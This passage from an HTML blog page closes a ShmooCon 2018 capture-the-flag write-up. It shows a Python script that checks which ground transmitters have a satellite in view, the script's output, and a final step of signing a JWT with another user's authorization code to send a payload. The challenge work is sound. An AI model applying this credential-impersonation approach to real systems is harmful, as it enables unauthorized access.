+2 43098  51.6433 220.8012 0002958 228.0883 233.9521 15.54138244 89759
+</code></pre></div></div>
+
+<p>The next part of the challenge was to find a valid transmitter to use to communicate with the satalite. I created a CSV of all the transmitters from https://gtn.shmoocon2018.aerstone.com/index.php?page=transmitter_report and used the following script to calculate which would return a valid azimuth and elevation as negative elevation is not possible, otherwise we are shoving the transmitter into the ground :)</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">ephem</span><span class="p">,</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">csv</span><span class="p">,</span> <span class="n">re</span>
+<span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="n">np</span>
+<span class="n">l1</span> <span class="o">=</span> <span class="s">"ZUMA"</span>
+<span class="n">l2</span> <span class="o">=</span> <span class="s">"1 43098C 18001A   17348.22568377  .00001930  00000-0  36372-4 0  9995"</span>
+<span class="n">l3</span> <span class="o">=</span> <span class="s">"2 43098  51.6433 220.8012 0002958 228.0883 233.9521 15.54138244 89759"</span>
+<span class="n">sat</span> <span class="o">=</span> <span class="n">ephem</span><span class="o">.</span><span class="n">readtle</span><span class="p">(</span><span class="n">l1</span><span class="p">,</span><span class="n">l2</span><span class="p">,</span><span class="n">l3</span><span class="p">)</span>
+<span class="n">ga</span> <span class="o">=</span> <span class="n">ephem</span><span class="o">.</span><span class="n">Observer</span><span class="p">()</span>
+<span class="n">now</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'stations.csv'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+ <span class="n">read</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">reader</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="n">delimiter</span><span class="o">=</span><span class="s">','</span><span class="p">)</span>
+ <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">read</span><span class="p">:</span>
+  <span class="n">ga</span><span class="o">.</span><span class="n">lat</span><span class="p">,</span> <span class="n">ga</span><span class="o">.</span><span class="n">lon</span><span class="p">,</span> <span class="n">ga</span><span class="o">.</span><span class="n">date</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">r</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nb">str</span><span class="p">(</span><span class="n">now</span><span class="p">)</span>
+  <span class="n">elevation</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">'m'</span><span class="p">,</span> <span class="s">''</span><span class="p">,</span> <span class="n">r</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
+  <span class="n">elevation</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">' '</span><span class="p">,</span> <span class="s">''</span><span class="p">,</span> <span class="n">elevation</span><span class="p">)</span>
+  <span class="n">ga</span><span class="o">.</span><span class="n">elevation</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="n">elevation</span><span class="p">)</span>
+  <span class="n">sat</span><span class="o">.</span><span class="n">compute</span><span class="p">(</span><span class="n">ga</span><span class="p">)</span>
+  <span class="k">if</span> <span class="n">np</span><span class="o">.</span><span class="n">degrees</span><span class="p">(</span><span class="n">sat</span><span class="o">.</span><span class="n">alt</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+          <span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[91m[-] Invalid"</span>
+  <span class="k">else</span><span class="p">:</span>
+   <span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[92m[+] Valid"</span>
+<span class="k">print</span> <span class="s">"</span><span class="si">%</span><span class="s">s: </span><span class="si">%.8</span><span class="s">f </span><span class="si">%8</span><span class="s">f</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">np</span><span class="o">.</span><span class="n">degrees</span><span class="p">(</span><span class="n">sat</span><span class="o">.</span><span class="n">az</span><span class="p">),</span><span class="n">np</span><span class="o">.</span><span class="n">degrees</span><span class="p">(</span><span class="n">sat</span><span class="o">.</span><span class="n">alt</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Keep in mind that this is time based, so the valid transmission station will change depending on the current UTC time. Running it just now produced the following results</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[-] Invalid
+Canberra Deep Space Communication Complex: DSS-34: 318.09532414 -55.197399
+[-] Invalid
+Canberra Deep Space Communication Complex: DSS-35: 318.09532414 -55.197399
+[-] Invalid
+Canberra Deep Space Communication Complex: DSS-36: 318.09532414 -55.197399
+[-] Invalid
+Canberra Deep Space Communication Complex: DSS-43: 318.09532414 -55.197399
+[-] Invalid
+Bukit Timah Satellite Earth Station: 334.22126417 -26.450271
+[-] Invalid
+Mount Pleasant Radio Observator: 316.30854665 -57.608711
+[-] Invalid
+White Sands Ground Terminal (WSGT): 4.04035571 -46.182362
+[-] Invalid
+Second TDRSS Ground Terminal (STGT): 4.03794679 -46.160064
+[-] Invalid
+Guam Remote Ground Terminal (GRGT): 320.34641789 -33.543175
+[-] Invalid
+Air Force Space Communications Network: 320.34636324 -33.542875
+[-] Invalid
+Goldstone Deep Space Communications Complex: 357.76820473 -44.785243
+[-] Invalid
+Goonhilly Satellite Earth Station-1: 58.65497350 -17.340131
+[-] Invalid
+Goonhilly Satellite Earth Station-2: 58.65215263 -17.341468
+[-] Invalid
+Goonhilly Satellite Earth Station-3: 58.65184527 -17.341560
+[-] Invalid
+Goonhilly Satellite Earth Station-4: 58.65197504 -17.340968
+[-] Invalid
+Goonhilly Satellite Earth Station-5: 58.65618927 -17.338323
+[-] Invalid
+AT&amp;T: 21.91821194 -38.965212
+[-] Invalid
+SANSA: 23.25788695 -40.554610
+[-] Invalid
+Kaena Point: 333.73205870 -46.822425
+[-] Invalid
+Swakopmund: 29.54945082 -41.809289
+[-] Invalid
+Troll: 48.47370569 -64.966301
+[-] Invalid
+Lurin: 29.17091491 -64.743500
+[+] Valid
+RSC Zheleznogorsk: 265.23312970 4.444074
+</code></pre></div></div>
+
+<p>As you can see, only one is valid, RSC Zheleznogorsk.
+The next step is to find a user in the system who can transmit from that system, generate a JWT with a valid signature using their Authorization Code, and base64 encode our payload from challenge 03.
+This will take trial and error as not every user is permitted to use every transmission station.</p>
+
+<p><img src="../images/aerstone/1*sx7OItJg9S01ekO4yUnbHg.png" alt="" /></p>
+
+<p><img src="../images/aerstone/1*pncgB02IcUePvo98JqtkQQ.png" alt="" /></p>
+
+<h1 id="the-end">THE END!</h1>
+
+
+</div>
+
+<div class="pagination">
+  
+  
+    <a href="/2017-07-17/fought-the-OSCE" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+
+    </main>
+
+    <footer>
+      <span>
+        &copy; <time datetime="2018-02-28 08:26:09 -0600">2018</time> t0w3ntum.
+      </span>
+    </footer>
+  </body>
+</html>
